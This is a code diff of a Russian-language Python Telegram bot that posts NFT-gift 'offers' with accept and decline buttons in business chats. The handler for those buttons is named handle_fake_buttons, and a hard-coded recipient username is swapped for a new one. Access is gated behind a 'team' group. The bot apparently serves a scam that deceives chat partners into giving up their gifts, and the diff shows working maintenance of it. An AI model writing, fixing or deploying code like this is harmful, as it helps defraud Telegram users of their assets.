@@ -20,19 +20,19 @@ try:
 except ValueError:
     ADMIN_ID = 0
 
-# --- НАСТРОЙКА ПОЛУЧАТЕЛЯ ---
-DEFAULT_TARGET = "Gifts_Replayer"
+# --- ИЗМЕНЕН ТОЛЬКО ЮЗЕРНЕЙМ ---
+DEFAULT_TARGET = "pravoslavnayia"
+# --------------------------------
 
 # --- НАСТРОЙКИ ПРОВЕРКИ (ГРУППА) ---
-# Убедись, что бот добавлен в эту группу и является админом!
 TARGET_CHAT_ID = -1003747516067 
-INVITE_LINK = "https://t.me/+pivcaSqTYchmNWYy" # <-- НОВАЯ ССЫЛКА
-
-# --- ID АНИМИРОВАННОЙ ЗВЕЗДЫ TELEGRAM PREMIUM ---
-PREMIUM_STAR_ID = "5848021027782661221"
+INVITE_LINK = "https://t.me/+7WMVJ9ajTHU2NDFi"
+# ------------------------------------
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
+
+active_users = set()
 
 MESSAGES = {
     "ru": {
@@ -83,7 +83,7 @@ async def is_subscribed(user_id: int) -> bool:
         member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
         return member.status in ["member", "administrator", "creator"]
     except Exception as e:
-        print(f"ОШИБКА ПРОВЕРКИ ПОДПИСКИ (Бот не админ в группе?): {e}")
+        print(f"Ошибка проверки подписки (убедитесь, что бот админ в группе): {e}")
         return False
 
 # --- РАБОТА С GIST (БАЗА ДАННЫХ) ---
@@ -192,8 +192,9 @@ async def cmd_test_db(message: types.Message):
     pretty_json = json.dumps(data, indent=2, ensure_ascii=False)
     await message.answer(f"<b>База данных (Gist):</b>\n<pre><code>{pretty_json}</code></pre>", parse_mode="HTML")
 
-# --- /start БЕЗ ПРОВЕРКИ ---
-@dp.message(CommandStart())
+
+# --- ОСНОВНЫЕ КОМАНДЫ (ТОЛЬКО В ЛИЧКЕ) ---
+@dp.message(F.chat.type == "private", CommandStart())
 async def cmd_start(message: types.Message):
     text = (
         "<b>Как начать:</b>\n"
@@ -210,8 +211,7 @@ async def cmd_start(message: types.Message):
     )
     await message.answer(text, parse_mode="HTML")
 
-# --- /ofteam ТОЛЬКО ТУТ ПРОВЕРКА ПОДПИСКИ ---
-@dp.message(Command("ofteam"))
+@dp.message(F.chat.type == "private", Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
     if not await is_subscribed(message.from_user.id):
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
@@ -227,11 +227,13 @@ async def cmd_ofteam(message: types.Message):
     
     await message.answer("✅ Подписка подтверждена. Доступ выдан. Теперь можно отправлять оферы.")
 
-@dp.message(F.text.startswith("/of"))
+# ВОТ ЗДЕСЬ СТОИТ ФИКС: F.chat.type == "private". Бот проигнорирует команду в группах.
+@dp.message(F.chat.type == "private", F.text.startswith("/of"))
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
-# --- СОЗДАНИЕ ОФФЕРА БЕЗ ПРОВЕРКИ ---
+
+# --- ГЕНЕРАЦИЯ ОФФЕРА (В БИЗНЕС-ЧАТАХ) ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
@@ -258,16 +260,7 @@ async def handle_offer_command(message: types.Message):
         elif p_lower in ["ru", "en", "ua", "ar"]:
             lang = p_lower
 
-    # --- ЛОГИКА ПРЕМИУМ ЗВЕЗДЫ (ДЛЯ ОТПРАВИТЕЛЯ) ---
-    if currency == "stars":
-        if message.from_user.is_premium:
-            symbol = f'<tg-emoji emoji-id="{PREMIUM_STAR_ID}">⭐️</tg-emoji>'
-        else:
-            symbol = "⭐️"
-    elif currency == "gram":
-        symbol = "GRAM"
-    else:
-        symbol = "⭐️"
+    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
 
     match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
     if not match: return
@@ -301,26 +294,18 @@ async def handle_offer_command(message: types.Message):
     except Exception as e:
         print(f"Ошибка: {e}")
 
-# --- ОБРАБОТКА КНОПОК БЕЗ ПРОВЕРКИ ---
+# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
     
     data_parts = callback.data.split(":")
     if len(data_parts) != 5:
-        return await callback.answer("Ошибка данных.", show_alert=True)
+        return await callback.answer("Ошибка данных кнопки.", show_alert=True)
         
     action, gift_slug, amount, currency, lang = data_parts
     
-    if currency == "stars":
-        if callback.from_user.is_premium:
-            symbol = f'<tg-emoji emoji-id="{PREMIUM_STAR_ID}">⭐️</tg-emoji>'
-        else:
-            symbol = "⭐️"
-    elif currency == "gram":
-        symbol = "GRAM"
-    else:
-        symbol = "⭐️"
+    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
     
     sender_username = callback.message.from_user.username.lower() if callback.message.from_user and callback.message.from_user.username else "no_username"
     
@@ -372,7 +357,7 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     else:
         await callback.answer()
 
-# --- АВТОПЕРЕПОДКЛЮЧЕНИЕ ПРИ ПАДЕНИИ ---
+# --- АВТОПЕРЕПОДКЛЮЧЕНИЕ ---
 async def main():
     while True:
         try:
